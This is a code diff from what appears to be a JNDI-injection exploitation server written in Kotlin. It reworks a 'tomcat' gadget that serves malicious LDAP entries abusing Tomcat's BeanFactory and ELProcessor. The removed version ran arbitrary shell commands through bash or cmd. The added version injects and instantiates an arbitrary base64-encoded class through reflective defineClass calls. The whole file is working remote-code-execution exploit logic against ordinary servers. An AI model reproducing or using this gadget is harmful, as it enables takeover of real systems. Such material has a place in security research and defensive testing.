@@ -4,41 +4,45 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
 import com.unboundid.ldap.sdk.Entry
 import com.unboundid.ldap.sdk.LDAPResult
 import com.unboundid.ldap.sdk.ResultCode
+import http.PayloadGenerator
 import org.apache.naming.ResourceRef
 import util.Options
 import util.base46cmd
 import util.serialize
+import util.toBase64
 import javax.naming.StringRefAddr
 
-fun LDAPServer.tomcat(result: InMemoryInterceptedSearchResult, base: String) {
-    val jsStr = """
-        var strs=new Array(3);
-        if(java.io.File.separator.equals('/')) {
-            strs[0]='/bin/bash';
-            strs[1]='-c';
-            strs[2]='${Options.command}';
-        } else {
-            strs[0]='cmd';
-            strs[1]='/C';
-            strs[2]='${Options.command}';
-        }
-        java.lang.Runtime.getRuntime().exec(strs);
+fun LDAPServer.tomcat(result: InMemoryInterceptedSearchResult, base: String, type: String) {
+    val payload = PayloadGenerator().generate(type).toBase64()
+
+    val jsCode = """
+        var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('$payload');
+        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
+        try {
+            var clazz = classLoader.loadClass('$type');
+            clazz.newInstance();
+        } catch(err) {
+            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);
+            method.setAccessible(true);
+            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);
+            clazz.newInstance();
+        };
     """.trimIndent()
 
-    val payload = """
-        {
-            "".getClass().forName("javax.script.ScriptEngineManager")
-            .newInstance().getEngineByName("JavaScript")
-            .eval("$jsStr")
-        }
-    """.trimIndent().replace("\n", "")
+    val exp = """
+        "".getClass()
+        .forName("javax.script.ScriptEngineManager")
+        .newInstance()
+        .getEngineByName("JavaScript")
+        .eval("$jsCode")
+    """.trimIndent()
 
     val ref = ResourceRef(
         "javax.el.ELProcessor", null, "", "",
         true, "org.apache.naming.factory.BeanFactory", null
     ).apply {
         add(StringRefAddr("forceString", "x=eval"))
-        add(StringRefAddr("x", payload))
+        add(StringRefAddr("x", exp))
     }
     val entry = Entry(base).apply {
         addAttribute("javaClassName", "java.lang.String")
